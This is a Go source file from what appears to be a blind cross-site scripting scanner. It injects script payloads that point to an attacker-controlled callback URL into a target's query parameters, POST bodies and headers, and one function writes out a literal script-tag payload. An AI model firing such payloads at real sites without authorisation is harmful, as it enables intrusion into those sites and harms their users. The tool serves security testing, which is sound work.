package blind

import (
	"bytes"
	"fmt"
	"net/http"
	"net/url"

	"github.com/lcalzada-xor/xxss/v3/pkg/logger"
	"github.com/lcalzada-xor/xxss/v3/pkg/models"
	"github.com/lcalzada-xor/xxss/v3/pkg/network"
	"github.com/lcalzada-xor/xxss/v3/pkg/scanner/payloads"
)

// Scanner handles blind XSS scanning
type Scanner struct {
	client   *network.Client
	headers  map[string]string
	logger   *logger.Logger
	blindURL string
	sem      chan struct{} // Semaphore for concurrency control
}

// NewScanner creates a new blind XSS scanner
func NewScanner(client *network.Client, headers map[string]string, logger *logger.Logger, blindURL string) *Scanner {
	// Default to 50 concurrent blind probes
	concurrency := 50
	return &Scanner{
		client:   client,
		headers:  headers,
		logger:   logger,
		blindURL: blindURL,
		sem:      make(chan struct{}, concurrency),
	}
}

// InjectContextualBlind injects context-specific blind XSS payloads
func (s *Scanner) InjectContextualBlind(targetURL, param string, context models.ReflectionContext) {
	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, param)
	contextPayloads := payloads.BlindPayloadsForContext(uniqueURL, context)

	s.logger.V("[BLIND] %s [%s] → %s (%d contextual payloads)", param, context, uniqueURL, len(contextPayloads))

	u, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	qs := u.Query()

	for _, payload := range contextPayloads {
		qs.Set(param, payload)
		u.RawQuery = qs.Encode()

		req, err := http.NewRequest("GET", u.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range s.headers {
			req.Header.Set(k, v)
		}

		// Fire and forget with concurrency control
		go func(r *http.Request) {
			s.sem <- struct{}{}        // Acquire
			defer func() { <-s.sem }() // Release

			resp, err := s.client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
	}
}

// InjectContextualBlindBody injects context-specific blind XSS payloads into POST body
func (s *Scanner) InjectContextualBlindBody(config *models.RequestConfig, param string, context models.ReflectionContext, params map[string]string, createBodyFunc func(map[string]string, string, string, models.ContentType) string) {
	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, param)
	contextPayloads := payloads.BlindPayloadsForContext(uniqueURL, context)

	s.logger.V("[BLIND] Body:%s [%s] → %s (%d contextual payloads)", param, context, uniqueURL, len(contextPayloads))

	for _, payload := range contextPayloads {
		testBody := createBodyFunc(params, param, payload, config.ContentType)

		req, err := http.NewRequest(string(config.Method), config.URL, bytes.NewBufferString(testBody))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", string(config.ContentType))
		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range s.headers {
			req.Header.Set(k, v)
		}

		// Fire and forget with concurrency control
		go func(r *http.Request) {
			s.sem <- struct{}{}        // Acquire
			defer func() { <-s.sem }() // Release

			resp, err := s.client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
	}
}

// InjectBlindHeader injects blind XSS payloads into headers
func (s *Scanner) InjectBlindHeader(targetURL, headerName string) {
	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, headerName)
	payload := fmt.Sprintf("\"><script src=\"%s\"></script>", uniqueURL)

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return
	}

	req.Header.Set(headerName, payload)
	go func(r *http.Request) {
		s.sem <- struct{}{}        // Acquire
		defer func() { <-s.sem }() // Release

		resp, err := s.client.Do(r)
		if err == nil && resp != nil {
			resp.Body.Close()
		}
	}(req)
}
